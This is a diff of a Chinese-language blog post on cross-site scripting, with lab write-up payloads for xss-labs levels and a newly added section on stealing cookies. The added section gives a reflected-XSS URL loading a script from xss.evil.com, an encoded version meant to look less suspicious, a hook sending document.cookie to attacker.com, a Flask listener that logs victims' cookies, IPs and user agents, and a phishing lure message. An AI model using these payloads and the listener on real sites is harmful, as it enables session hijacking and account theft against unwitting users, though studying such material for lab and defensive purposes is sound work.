@@ -10,15 +10,15 @@
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="xss一、xss攻击方式 反射型xss 非持久化，要点击事先制造好的攻击链接才能触发xss代码，一般出现在搜索界面。  储存型xss 持久化，代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行。  DOM型xss 基于文档对象模型Document Object Model，DOM)的">
+  <meta name="description" content="xss(跨站脚本攻击)一、xss攻击方式 反射型xss 非持久化，要点击事先制造好的攻击链接才能触发xss代码，一般出现在搜索界面。  储存型xss 持久化，代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行。  DOM型xss 基于文档对象模型Document Object Mod">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss">
 <meta property="og:url" content="http://example.com/2025/01/24/xss/index.html">
 <meta property="og:site_name" content="佘雅晴のblog">
-<meta property="og:description" content="xss一、xss攻击方式 反射型xss 非持久化，要点击事先制造好的攻击链接才能触发xss代码，一般出现在搜索界面。  储存型xss 持久化，代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行。  DOM型xss 基于文档对象模型Document Object Model，DOM)的">
+<meta property="og:description" content="xss(跨站脚本攻击)一、xss攻击方式 反射型xss 非持久化，要点击事先制造好的攻击链接才能触发xss代码，一般出现在搜索界面。  储存型xss 持久化，代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行。  DOM型xss 基于文档对象模型Document Object Mod">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-01-24T14:14:35.000Z">
-<meta property="article:modified_time" content="2025-07-10T12:06:43.254Z">
+<meta property="article:modified_time" content="2025-07-10T13:16:49.200Z">
 <meta property="article:author" content="snake&#39;blog">
 <meta name="twitter:card" content="summary">
   
@@ -244,7 +244,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">1.3k字</span>
+      <span class="post-count">1.7k字</span>
     </span>
   </span>
 
@@ -253,7 +253,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">5分</span>
+      <span class="post-count">7分</span>
     </span>
   </span>
 </div>
@@ -264,7 +264,7 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h3 id="一、xss攻击方式"><a href="#一、xss攻击方式" class="headerlink" title="一、xss攻击方式"></a>一、xss攻击方式</h3><ol>
+    <h1 id="xss-跨站脚本攻击"><a href="#xss-跨站脚本攻击" class="headerlink" title="xss(跨站脚本攻击)"></a>xss(跨站脚本攻击)</h1><h3 id="一、xss攻击方式"><a href="#一、xss攻击方式" class="headerlink" title="一、xss攻击方式"></a>一、xss攻击方式</h3><ol>
 <li><p>反射型xss</p>
 <p>非持久化，要点击事先制造好的攻击链接才能触发xss代码，一般出现在搜索界面。</p>
 </li>
@@ -341,7 +341,7 @@
 </li>
 </ol>
 <h5 id="一套码测测关键字："><a href="#一套码测测关键字：" class="headerlink" title="一套码测测关键字："></a>一套码测测关键字：</h5><p><code>&quot; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt; &amp;#106;</code></p>
-<h3 id="xss-labs题解"><a href="#xss-labs题解" class="headerlink" title="xss_labs题解"></a>xss_labs题解</h3><p>1.<code>&lt;scripr&gt;alert()&lt;/script&gt;</code>即可</p>
+<h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><h3 id="xss-labs题解"><a href="#xss-labs题解" class="headerlink" title="xss_labs题解"></a>xss_labs题解</h3><p>1.<code>&lt;scripr&gt;alert()&lt;/script&gt;</code>即可</p>
 <p>2.前面加<code>&quot;&gt;</code>将前面闭合然后alert即可</p>
 <p>3.单引号闭合，因为&gt;&lt;被实体化了，所有我们用伪协议绕过，<code>&#39; onfocus=javascript:alert() &#39;</code></p>
 <p>​	(onfocus再次点击触发)</p>
@@ -355,6 +355,29 @@
 <p>11.referer头，抓包添加<code>referer: &quot; sRc Date Onfocus &lt;sCript&gt; &lt;a hRef=javascript:alert()&gt; &amp;#106;</code>测一下，发现过滤掉了&gt;&lt; ,所有用onfocus，<code>Referer: &quot;onfocus=javascript:alert() type=&quot; text</code></p>
 <p>12.随便传参看看，发现value里是user-Agent的值，所有抓包改user-Agent，<code>&quot; onfocus=javascript:alert() type=&quot;text</code></p>
 <p>13.name是t_cook ,考虑是cookie头，F12找到cookie名为user，改user的value <code>&quot; onfocus=javascript:alert() type=&quot;text</code></p>
+<h2 id="用XSS偷Cookie："><a href="#用XSS偷Cookie：" class="headerlink" title="用XSS偷Cookie："></a>用XSS偷Cookie：</h2><p>例：</p>
+<p>若某个网站存在反射型XSS漏洞，则</p>
+<h5 id="1-攻击者将脚本写入URL参数中，并伪装成普通链接："><a href="#1-攻击者将脚本写入URL参数中，并伪装成普通链接：" class="headerlink" title="1.攻击者将脚本写入URL参数中，并伪装成普通链接："></a>1.攻击者将脚本写入URL参数中，并伪装成普通链接：</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable.site/search?query=&lt;script src=&quot;http://xss.evil.com/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>编码一下更具有迷糊性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable.site/search?query=%3Cscript%20src%3D%22http%3A%2F%2Fxss.evil.com%2Fhook.js%22%3E%3C%2Fscript%3E</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-配合XSS平台-如XSSHunter，Beeceptor，自己搭建监听服务"><a href="#2-配合XSS平台-如XSSHunter，Beeceptor，自己搭建监听服务" class="headerlink" title="2.配合XSS平台(如XSSHunter，Beeceptor，自己搭建监听服务)"></a>2.配合XSS平台(如XSSHunter，Beeceptor，自己搭建监听服务)</h5><p>使用XSS Hunter这类平台或自己搭建监听服务来接受Cookie信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// hook.js（托管在 http://xss.evil.com/hook.js 上）</span><br><span class="line">new Image().src = &quot;http://attacker.com/log?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure>
+
+<p>搭一个监听服务XSS-Listener.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import datetime</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/log&#x27;)</span><br><span class="line">def log():</span><br><span class="line">    cookie = request.args.get(&#x27;cookie&#x27;, &#x27;&#x27;)</span><br><span class="line">    ua = request.headers.get(&#x27;User-Agent&#x27;, &#x27;&#x27;)</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    time = datetime.datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line"></span><br><span class="line">    log_entry = f&quot;[&#123;time&#125;] IP: &#123;ip&#125; | UA: &#123;ua&#125; | Cookie: &#123;cookie&#125;\n&quot;</span><br><span class="line">    print(log_entry)</span><br><span class="line"></span><br><span class="line">    # 可选：写入文件</span><br><span class="line">    with open(&quot;xss_logs.txt&quot;, &quot;a&quot;) as f:</span><br><span class="line">        f.write(log_entry)</span><br><span class="line"></span><br><span class="line">    return &#x27;Logged&#x27;, 200</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8000)		</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>则本地监听器地址是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://你的IP地址:8000/log</span><br></pre></td></tr></table></figure>
+
+<p>构造payload，托管在目标网站上：（去ngrok暴露在公网上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  new Image().src = &quot;http://你的公网IP:8000/log?cookie=&quot; + document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="3-钓鱼-诱导目标点击链接-社会工程学"><a href="#3-钓鱼-诱导目标点击链接-社会工程学" class="headerlink" title="3.钓鱼,诱导目标点击链接(社会工程学)"></a>3.钓鱼,诱导目标点击链接(社会工程学)</h5><p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hi，你看看这个页面是不是你发布的内容？我有点怀疑：  </span><br><span class="line">👉 http://vulnerable.site/search?query=xxxx</span><br></pre></td></tr></table></figure>
+
+<p>一旦用户点击，即可偷到Cookie.</p>
 
     
 
